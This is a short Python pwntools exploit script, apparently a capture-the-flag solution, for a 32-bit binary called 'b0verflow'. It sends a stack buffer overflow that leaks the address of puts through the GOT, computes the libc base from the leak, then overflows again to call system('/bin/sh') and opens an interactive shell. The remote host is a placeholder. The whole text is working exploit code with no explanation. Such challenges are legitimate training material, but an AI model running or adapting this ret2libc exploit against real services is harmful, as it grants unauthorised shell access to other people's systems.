#!/usr/bin/env python3

from pwn import *

exe = ELF("./b0verflow")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.sendline("A" * 0x20 + "BBBB" + p32(exe.symbols['puts']) + p32(0x0804851b) + p32(exe.got['puts']))
    r.recvuntil("BBBB")
    r.recvn(14)
    leak = u32(r.recvn(4))
    libc.address = leak - libc.symbols['puts']

    r.sendline("A" * 0x20 + "BBBB" + p32(libc.symbols['system']) + "CCCC" + p32(next(libc.search('/bin/sh\x00'))))
    r.interactive()


if __name__ == "__main__":
    main()
